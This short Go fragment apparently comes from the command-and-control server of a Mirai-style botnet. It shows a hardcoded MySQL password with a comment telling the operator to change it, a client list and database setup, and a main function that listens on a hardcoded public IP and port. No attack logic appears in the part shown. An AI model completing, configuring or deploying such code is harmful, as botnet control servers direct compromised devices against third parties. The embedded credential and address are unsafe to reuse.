...
const DatabasePass string = "N0Sk!dZ_4LLow3D" //This is your mysql pass, so change it to whatever you're gonna use
const DatabaseTable string = "trash"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
	tel, err := net.Listen("tcp", "77.68.125.237:9483")
	if err != nil {
		fmt.Println(err)
		return
	}
